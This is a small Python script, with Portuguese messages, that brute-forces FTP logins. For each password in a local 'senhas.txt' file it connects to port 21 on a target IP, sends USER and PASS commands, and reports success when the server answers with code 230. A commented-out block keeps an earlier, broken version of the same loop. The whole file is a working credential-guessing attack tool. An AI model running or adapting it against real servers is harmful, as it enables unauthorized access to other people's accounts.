import socket,sys,re

if len(sys.argv) <= 2:
    print("Modo de uso: python3 bruteforce-ftp.py 192.168.15.10 usuario1 ")
    sys.exit()
else:
    target=sys.argv[1]
    user=sys.argv[2]
    with open('senhas.txt') as f:
        for i in f:
            print(f"{user}:{i}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target,21))
            s.recv(1024)

            s.send(b"USER " + user.encode() + b"\r\n")
            s.recv(1024)
            s.send(b"PASS " + i.encode() + b"\r\n")
            resp = s.recv(1024).decode()
            print(resp)
            s.send(b"QUIT\r\n")



            """
            s.send(b"USER {user} \r\n")
            s.recv(1024)
            s.send(b"PASS {i} \r\n")
            resp=s.recv(1024).decode()
            print(resp)
            s.send(b"QUIT \r\n")"""

            if re.search('230',resp):
                print(f"[::] Senha encontrada ---> {resp}")
            else:
                print("Acesso negado")
